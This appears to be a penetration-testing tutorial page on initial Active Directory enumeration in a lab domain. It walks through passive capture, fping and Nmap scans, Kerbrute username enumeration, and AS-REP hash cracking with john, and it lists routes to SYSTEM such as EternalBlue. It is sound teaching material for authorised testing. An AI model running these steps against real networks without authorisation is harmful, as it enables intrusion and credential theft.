---
title: "Initial Domain Enumeration"
description: "From an anonymous position on the internal network to a foothold — passive listening, host discovery, Nmap service enumeration, identifying the DC, and Kerbrute username enumeration."
tags:
  - Active Directory
  - Enumeration
  - Nmap
  - Kerbrute
  - Internal
---

# Initial Domain Enumeration

You are plugged into the internal network with **no credentials**. The objective of this phase is narrow and concrete: get from *anonymous* to either a **valid domain user credential** or **SYSTEM on a domain-joined host** — because `NT AUTHORITY\SYSTEM` on a domain member behaves like a domain user and can enumerate AD. Everything else in this section builds on what you learn here.

!!! note "What you are collecting"
    | Data point | Why |
    | :--- | :--- |
    | Valid AD usernames | The seed list for password spraying |
    | Domain Controllers | IP, hostname, FQDN — the heart of the domain |
    | Key services | DNS (53), Kerberos (88), LDAP (389/636), SMB (445) |
    | File / SQL / web servers | High-value lateral-movement targets |
    | Legacy-OS hosts | Possible EternalBlue / MS08-067 targets |

## Engagement setups vary

How you are placed on the network changes what is possible. Common arrangements:

- A Linux pentest VM inside the network, calling back over VPN to a jump host.
- A physical device on-site over Ethernet with a VPN callback.
- A cloud VM with internal access and SSH from a whitelisted IP.
- **VPN-only access** — note this limits LLMNR/NBT-NS poisoning, which needs to be on the same broadcast segment.
- A managed Windows workstation or VDI with varying restrictions.

The methodology below assumes a position on the local segment. Work it top to bottom — quiet techniques first, louder ones once scope allows.

```text
Passive listening (Wireshark / Responder -A)
  → ICMP sweep (fping)
    → Nmap service + OS scan
      → Kerbrute username enumeration
        → Foothold (creds or SYSTEM)
```

## Phase 1 — Passive listening

Passive capture generates **no extra packets**, so it carries the lowest detection risk. Just listening on an AD segment reveals hostnames and IPs through the broadcast chatter (ARP, mDNS, LLMNR, NBT-NS).

=== "Wireshark (GUI)"

    ```bash
    sudo -E wireshark
    ```

    Watch ARP to reveal live host IPs and mDNS to reveal hostnames. Save to a `.pcap` for later review.

=== "tcpdump (headless)"

    ```bash
    sudo tcpdump -i ens224
    sudo tcpdump -i ens224 -w capture.pcap   # save for later analysis
    ```

=== "Responder — Analyze mode"

    ```bash
    sudo responder -I ens224 -A
    ```

    The `-A` flag is **passive analysis only — no poisoning**. Responder listens for LLMNR, NBT-NS, and mDNS traffic and surfaces hosts and naming conventions that ARP alone misses. This is the safe first look; active poisoning is covered in [LLMNR & NBT-NS Poisoning](llmnr-nbtns-poisoning.md).

## Phase 2 — Active host discovery

A fast ICMP sweep gives a quick inventory of live hosts. Hosts that block ICMP won't appear, so treat this as a first pass, not the final word.

```bash
fping -asgq 172.16.5.0/23
```

| Flag | Meaning |
| :--- | :--- |
| `-a` | Show only alive hosts |
| `-s` | Print summary statistics |
| `-g` | Generate the target list from the CIDR range |
| `-q` | Quiet — no per-target noise |

Example run against the lab subnet:

```text
172.16.5.5
172.16.5.130
172.16.5.225

     510 targets
       3 alive
     507 unreachable
```

Save the alive hosts to `hosts.txt` to feed Nmap.

## Phase 3 — Nmap service & OS enumeration

Nmap turns a list of live IPs into a map of services, OS versions, and — crucially — which host is the Domain Controller.

```bash
# Aggressive scan of discovered hosts; -A = OS + version + scripts + traceroute
sudo nmap -v -A -iL hosts.txt -oA host-enum
```

!!! tip "Always save in all formats"
    Use `-oA` (not just `-oN`) so you get normal, XML, and grepable output in one go — useful for reporting and for feeding results into other tools.

### Reading the output — spotting the DC

The DC gives itself away. Look for the combination of **Kerberos (88) + LDAP (389)** plus a certificate or RDP banner that leaks the domain name:

```text
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL...)
| ssl-cert: Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL, ...
445/tcp  open  microsoft-ds?
636/tcp  open  ssl/ldap
3268/tcp open  ldap          (Global Catalog)
| rdp-ntlm-info:
|   NetBIOS_Computer_Name: ACADEMY-EA-DC01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|_  DNS_Computer_Name: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

That host (`172.16.5.5` = `ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`) is the DC. Note its IP, hostname, and FQDN — most later commands point at it with `<DC_IP>` and `<DOMAIN>`.

Also flag the interesting non-DC hosts: SQL servers (e.g. MSSQL 2019 on a file server), and any **legacy OS** (Windows Server 2008 R2, IIS 7.5) that may be vulnerable to EternalBlue or MS08-067.

!!! warning "Scan impact and scope"
    Some Nmap NSE scripts perform **active vulnerability checks that can crash fragile hosts** (industrial sensors, legacy appliances). On evasive engagements, a full `-A` scan will light up the SOC. Confirm the testing style in writing and get explicit approval before exploiting any legacy host.

## Phase 4 — Username enumeration with Kerbrute

Kerbrute abuses Kerberos **pre-authentication**: it asks the KDC for a TGT for each candidate username. An invalid name returns `PRINCIPAL UNKNOWN`; a valid one prompts for pre-auth. This is comparatively stealthy because, done as pure enumeration, it does **not** generate the Event ID 4625 (failed logon) that SOCs commonly alert on.

### Setup

```bash
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
sudo make all
sudo mv dist/kerbrute_linux_amd64 /usr/local/bin/kerbrute
```

### Enumerate

```bash
kerbrute userenum -d <DOMAIN> --dc <DC_IP> jsmith.txt -o valid_ad_users
```

| Flag | Meaning |
| :--- | :--- |
| `userenum` | Username-enumeration mode |
| `-d` | Target domain |
| `--dc` | Domain Controller IP |
| `-o` | Output file of valid usernames |

Use a statistically-likely wordlist such as `jsmith.txt` (the `flast` format, ~48,700 names) from the **statistically-likely-usernames** repo. A run checks tens of thousands of names in seconds:

```text
[+] VALID USERNAME:  jjones@INLANEFREIGHT.LOCAL
[+] VALID USERNAME:  tjohnson@INLANEFREIGHT.LOCAL
[+] mmorgan has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:f5daa7d9...
...
Done! Tested 48705 usernames (56 valid) in 9.502 seconds
```

### A free win — AS-REP Roasting

Notice the `mmorgan has no pre auth required` line above. Any account with Kerberos pre-authentication disabled (`DONT_REQ_PREAUTH`) will have its **AS-REP dumped by Kerbrute automatically** — a hash you can crack offline with no credentials at all:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# Welcome!00  ($krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL)
```

Crack it and you may have your first valid credential before spraying a single password.

!!! danger "Kerbrute spraying does lock accounts"
    Username *enumeration* is safe, but when you move on to Kerbrute **password spraying**, failed pre-auth attempts count toward the lockout policy. Read the policy first — see [Password Spraying](password-spraying.md).

## Getting SYSTEM as an alternative foothold

If you cannot get a credential, SYSTEM on a domain-joined host is just as good for enumeration. Common routes:

- Remote exploits on legacy hosts — EternalBlue, BlueKeep, MS08-067.
- Abusing a service with `SeImpersonatePrivilege` (e.g. a Potato-style attack on older OSes).
- A local privilege-escalation bug.
- Local admin → PsExec → SYSTEM shell.

SYSTEM on a domain member unlocks BloodHound/PowerView enumeration, Kerberoasting, AS-REP Roasting, NetNTLM capture with Inveigh, token impersonation, and ACL attacks.

## Key takeaways

- The goal of this phase is one thing: **anonymous → credential or SYSTEM**.
- Go quiet first (passive capture), then louder (fping, Nmap) as scope allows.
- The DC is the host running **Kerberos + LDAP**, and its certificate/RDP banner leaks the domain name.
- Kerbrute user enumeration is stealthy (no 4625) and sometimes hands you a free AS-REP hash.
- Always save output immediately — AD enumeration produces a lot of data you will need later.
